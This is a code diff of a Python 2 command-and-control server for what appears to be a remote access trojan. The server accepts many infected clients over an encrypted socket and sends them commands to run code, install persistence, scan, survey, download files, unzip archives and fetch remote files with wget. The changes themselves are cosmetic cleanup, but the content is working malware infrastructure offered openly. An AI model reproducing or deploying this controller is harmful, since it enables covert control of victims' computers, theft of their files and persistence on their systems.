@@ -9,12 +9,10 @@
 import argparse
 import readline
 import socket
-import struct
 import sys
 import threading
 import time
 
-from core import common
 from core import crypto
 from core import filesock
 
@@ -55,14 +53,14 @@ class Server(threading.Thread):
     clients      = []
     alive        = True
     client_count = 1
-    
+
     def __init__(self, port):
         super(Server, self).__init__()
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', port))
         self.s.listen(5)
-    
+
     def run(self):
         while True:
             conn, addr = self.s.accept()
@@ -70,7 +68,7 @@ class Server(threading.Thread):
             client_id = self.client_count
             self.clients.append({'client_id': client_id, 'client': client})
             self.client_count += 1
-    
+
     def verify_client_id(self, client_id):
         try:
             client_index = next(i for (i, d) in enumerate(self.clients) if \
@@ -78,7 +76,7 @@ class Server(threading.Thread):
             return True, 'Client {} selected.'.format(client_id)
         except (StopIteration, ValueError):
             return False, 'Error: Invalid client ID.'
-    
+
     def select_client(self, client_id):
         try:
             for c in self.clients:
@@ -86,10 +84,10 @@ class Server(threading.Thread):
                     return c['client']
         except (ValueError, IndexError):
             print 'Error: Invalid client ID.'
-    
+
     def get_clients(self):
         return [c for c in self.clients if c['client'].alive]
-    
+
     def remove_client(self, conn):
         conn_to_remove = next(i for i in self.clients if i['client'] == conn)
         self.clients.remove(conn_to_remove)
@@ -97,7 +95,7 @@ class Server(threading.Thread):
 
 class ClientConnection(threading.Thread):
     alive = True
-    
+
     def __init__(self, conn, addr):
         super(ClientConnection, self).__init__()
         self.conn   = conn
@@ -107,22 +105,21 @@ class ClientConnection(threading.Thread):
         self.IV     = 0
         self.conn.setblocking(0)
         self.start()
-    
+
     def send(self, prompt, cmd, action):
         if not self.alive:
             print 'Error: Client not connected.'
             return
-        
+
         # send prompt to client
-        # self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
         crypto.sendGCM(self.conn, self.GCM, self.IV, prompt)
         self.conn.settimeout(1)
         self.IV += 1
-        
+
         # kill client connection
         if cmd == 'kill':
             self.conn.close()
-        
+
         # download a file
         elif cmd == 'download':
             for fname in action.split():
@@ -139,13 +136,11 @@ class ClientConnection(threading.Thread):
         elif cmd == 'rekey':
             self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
-        # results of survey, persistence, unzip, or wget
-        elif cmd in ['execute', 'scan', 'survey', 'persistence', 'unzip', 'wget']:
+        # results of execute, persistence, scan, survey, unzip, or wget
+        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
             recv_data = crypto.recvGCM(self.conn, self.GCM).rstrip()
             print recv_data
-            #recv_data = self.conn.recv(1024)
-            #print crypto.AES_decrypt(recv_data, self.dh_key)
 
 
 def get_parser():
@@ -159,7 +154,7 @@ def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     port    = args['port']
-    
+
     curr_client_id  = '?'
 
     # print banner all sexy like
@@ -192,7 +187,7 @@ def main():
         if cmd == 'help':
             print HELP_TEXT
             continue
-        
+
         # stop the server
         elif cmd == 'quit':
             quit_option = raw_input('Exit the server and end all client ' \
@@ -200,8 +195,7 @@ def main():
             if quit_option[0].lower() == 'y':
                 # gracefull kill all clients here
                 sys.exit(0)
-            else:
-                continue
+            continue
 
         # select client
         elif cmd == 'client':
@@ -210,7 +204,7 @@ def main():
                 curr_client_id = action
             print message
             continue
-        
+
         # list clients
         elif cmd == 'clients':
             print 'ID - Client Address'
@@ -222,17 +216,17 @@ def main():
         if curr_client_id == '?':
             print 'Error: Invalid client ID.'
             continue
-        
+
         # get client object based on current client id
         client = server.select_client(curr_client_id)
-        
+
         # send data to client
         try:
             client.send(prompt, cmd, action)
         except (socket.error, ValueError):
-            print "Client {} disconnected.".format(curr_client_id)
+            print 'Client {} disconnected.'.format(curr_client_id)
             cmd = 'kill'
-        
+
         # reset client id if client killed
         if cmd == 'kill':
             server.remove_client(client)
